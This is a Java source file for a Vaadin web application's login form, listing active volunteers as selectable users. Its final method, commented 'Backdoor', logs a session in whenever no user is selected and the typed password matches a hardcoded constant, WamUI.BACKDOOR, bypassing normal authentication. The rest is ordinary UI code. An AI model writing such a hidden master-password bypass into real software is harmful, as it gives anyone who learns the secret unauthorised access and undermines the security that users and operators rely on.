package it.algos.wam.login;

import com.vaadin.addon.jpacontainer.JPAContainer;
import com.vaadin.data.Container;
import com.vaadin.data.Property;
import com.vaadin.data.util.filter.Compare;
import com.vaadin.ui.Component;
import it.algos.wam.entity.volontario.Volontario;
import it.algos.wam.entity.volontario.Volontario_;
import it.algos.wam.ui.WamUI;
import it.algos.webbase.multiazienda.ERelatedComboField;
import it.algos.webbase.web.login.DefaultLoginForm;
import it.algos.webbase.web.login.UserIF;

/**
 * Created by alex on 25-05-2016.
 * .
 */
public class WamLoginForm extends DefaultLoginForm {

    private ERelatedComboField userCombo;

    @Override
    public Component createUsernameComponent() {
        userCombo = new ERelatedComboField(Volontario.class, "Utente");
        userCombo.sort(Volontario_.cognome, Volontario_.nome);

        //--filtro. Solo quelli attivi
        Container.Filter filter = new Compare.Equal(Volontario_.attivo.getName(), true);
        JPAContainer filterableContainer = (JPAContainer) userCombo.getContainerDataSource();
        filterableContainer.addContainerFilter(filter);

        userCombo.addValueChangeListener(new Property.ValueChangeListener() {
            @Override
            public void valueChange(Property.ValueChangeEvent valueChangeEvent) {
                getPassField().clear();
            }
        });

        return userCombo;
    }

    @Override
    public void setUsername(String name) {
        Volontario v = Volontario.queryByNick(name);
        if (v != null) {
            userCombo.setValue(v.getId());
        } else {
            userCombo.setValue(null);   // no selection
        }
    }


    @Override
    /**
     * @return the selected user
     */
    public UserIF getSelectedUser() {
        UserIF user = null;
        Object obj = userCombo.getSelectedBean();
        if (obj != null) {
            if (obj instanceof UserIF) {
                user = (UserIF) obj;
            }
        }
        return user;
    }

    /**
     * Created by gac on 8-8-2016.
     * Backdoor
     */
    @Override
    protected void onConfirm() {
        UserIF user = getSelectedUser();
        String password = getPassField().getValue();
        if (user == null && password.equals(WamUI.BACKDOOR)) {
            utenteLoggato();
        } else {
            super.onConfirm();
        }// end of if/else cycle
    }// end of method

}// end of class
